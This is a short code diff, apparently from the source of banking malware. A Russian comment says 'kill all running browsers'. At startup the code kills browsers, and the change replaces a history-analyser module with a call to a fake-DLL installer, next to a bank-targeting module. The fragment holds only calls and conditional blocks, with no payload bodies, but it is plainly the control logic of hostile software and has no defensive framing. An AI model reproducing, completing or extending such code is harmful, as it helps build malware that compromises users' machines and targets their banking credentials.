@@ -54,8 +54,8 @@ void ExplorerStart(PEventData Data)
 	// Убиваем все запущенные браузеры
 	KillAllBrowsers();
 
-	#ifdef HistoryAnalizerH
-    	HisAnalizer::Execute();
+	#ifdef FakeDllInstallerH
+    	FDI::Execute();
 	#endif
 
 	#ifdef BBSCBankH
